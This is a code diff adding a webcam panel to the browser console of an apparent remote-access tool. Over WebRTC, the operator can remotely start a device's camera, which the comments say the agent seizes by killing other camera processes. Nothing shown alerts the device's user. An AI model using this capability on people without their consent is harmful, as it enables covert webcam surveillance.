@@ -554,6 +554,12 @@ function connectWS() {
       case 'monitors': renderMonitors(msg); break;
       case 'rtc-offer': onRtcOffer(msg); break;
       case 'rtc-ice': if (rtcPc && msg.candidate) { rtcDiag.remoteCand.add(candType(msg.candidate)); rtcLog('remote candidate', candType(msg.candidate)); rtcPc.addIceCandidate(msg.candidate).catch((e) => rtcLog('addIceCandidate error', e.message)); } break;
+      // Webcam channel (parallel to the screen rtcPc). The agent opens the
+      // camera on cam-start and offers a track; we answer here and show it in
+      // the side panel. See the Camera section near the end of the file.
+      case 'cam-rtc-offer': onCamRtcOffer(msg); break;
+      case 'cam-rtc-ice':   if (camPc && msg.candidate) camPc.addIceCandidate(msg.candidate).catch(() => {}); break;
+      case 'cam-state':     onCamState(msg); break;
       case 'control': $('#ctl-warn').hidden = msg.available !== false ? true : false; if (msg.available === false) toast('Control is blocked on this device — antivirus is blocking the input helper. Allow/whitelist it on the remote PC, or use a code-signed build.', 'err'); break;
       case 'agentGone': toast('Device disconnected', 'err'); backToDashboard(); leaveSolo(); break;
       // Agent reports its screen dimensions (also sent when locked so the console
@@ -2334,6 +2340,7 @@ function backToDashboard() {
   blankOn = false; blankActive = false; updateBlankBtn();
   lockOn = false; updateLockBtn();
   closeConsoleRtc();
+  try { stopCam(); } catch {} // release the webcam if the operator left the panel open
   $('#control-view').hidden = true;
   $('#monitor-select').hidden = true;
 }
@@ -2581,6 +2588,113 @@ function closeConsoleRtc() {
   const v = $('#rtc-video'); try { v.srcObject = null; } catch {}
   $('#screen-wrap').classList.remove('rtc');
 }
+
+// ---------------------------------------------------------------------------
+// Camera panel — a second RTCPeerConnection whose only track is the device's
+// webcam. The operator clicks the camera icon in sc-tabs; we send cam-start,
+// the agent kills any process holding the webcam (Camera.exe etc.) and
+// opens getUserMedia({video:true}), then offers us the track via cam-rtc-*.
+// ---------------------------------------------------------------------------
+let camPc = null;
+let camActive = false;
+
+function openCamPanel() {
+  const p = document.getElementById('cam-panel');
+  if (!p) return;
+  p.hidden = false;
+  document.getElementById('cam-tab')?.classList.add('active');
+}
+function closeCamPanelUi() {
+  const p = document.getElementById('cam-panel');
+  if (p) p.hidden = true;
+  document.getElementById('cam-tab')?.classList.remove('active');
+  document.getElementById('screen-wrap')?.classList.remove('cam-split');
+}
+function setCamStatus(text) {
+  const el = document.getElementById('cam-status');
+  if (el) el.textContent = text || '';
+}
+
+function startCam() {
+  if (camActive) { openCamPanel(); return; }
+  camActive = true;
+  openCamPanel();
+  setCamStatus('starting…');
+  document.getElementById('cam-placeholder')?.classList.remove('hidden');
+  if (ws && ws.readyState === ws.OPEN) ws.send(JSON.stringify({ type: 'cam-start' }));
+}
+function stopCam() {
+  if (ws && ws.readyState === ws.OPEN) ws.send(JSON.stringify({ type: 'cam-stop' }));
+  closeCamRtc();
+  camActive = false;
+  closeCamPanelUi();
+}
+function closeCamRtc() {
+  if (camPc) { try { camPc.close(); } catch {} camPc = null; }
+  const v = document.getElementById('cam-video');
+  if (v) { try { v.srcObject = null; } catch {} }
+}
+
+async function onCamRtcOffer(msg) {
+  closeCamRtc();
+  try {
+    camPc = new RTCPeerConnection({ iceServers: rtcIceServers || RTC_ICE });
+    camPc.onicecandidate = (e) => {
+      if (e.candidate && ws && ws.readyState === ws.OPEN) {
+        ws.send(JSON.stringify({ type: 'cam-rtc-ice', candidate: e.candidate }));
+      }
+    };
+    camPc.ontrack = (e) => {
+      const v = document.getElementById('cam-video');
+      if (!v) return;
+      v.srcObject = e.streams[0];
+      v.play().catch(() => {});
+      document.getElementById('cam-placeholder')?.classList.add('hidden');
+    };
+    camPc.onconnectionstatechange = () => {
+      if (!camPc) return;
+      if (camPc.connectionState === 'connected') setCamStatus('live');
+      else if (['failed', 'disconnected', 'closed'].includes(camPc.connectionState)) {
+        setCamStatus('ended');
+      }
+    };
+    await camPc.setRemoteDescription(msg.sdp);
+    const answer = await camPc.createAnswer();
+    await camPc.setLocalDescription(answer);
+    if (ws && ws.readyState === ws.OPEN) {
+      ws.send(JSON.stringify({ type: 'cam-rtc-answer', sdp: camPc.localDescription }));
+    }
+  } catch (e) {
+    setCamStatus('error');
+    closeCamRtc();
+  }
+}
+
+function onCamState(msg) {
+  const s = String(msg.state || '');
+  if (s === 'starting') setCamStatus('starting…');
+  else if (s === 'live') setCamStatus('live');
+  else if (s === 'stopped') { setCamStatus('off'); closeCamRtc(); camActive = false; }
+  else if (s === 'error') { setCamStatus('error · ' + (msg.note || '')); toast('Camera: ' + (msg.note || 'open failed'), 'err'); camActive = false; }
+  else if (s === 'ended') { setCamStatus('ended'); closeCamRtc(); camActive = false; }
+}
+
+// Wire the toolbar button + panel chrome once the DOM is ready.
+document.addEventListener('DOMContentLoaded', function () {
+  document.getElementById('cam-tab')?.addEventListener('click', function (e) {
+    e.stopPropagation();
+    if (camActive) stopCam(); else startCam();
+  });
+  document.getElementById('cam-close')?.addEventListener('click', stopCam);
+  document.getElementById('cam-stop')?.addEventListener('click', stopCam);
+  document.getElementById('cam-split')?.addEventListener('click', function () {
+    document.getElementById('screen-wrap')?.classList.toggle('cam-split');
+  });
+});
+
+// When the session detaches, close the camera too so we don't leave the
+// agent holding the webcam headlessly after the operator walks away.
+window.addEventListener('beforeunload', function () { try { stopCam(); } catch {} });
 $('#fit').addEventListener('click', fit);
 $('#fs-btn').addEventListener('click', toggleFullscreen);
 window.addEventListener('resize', fit);
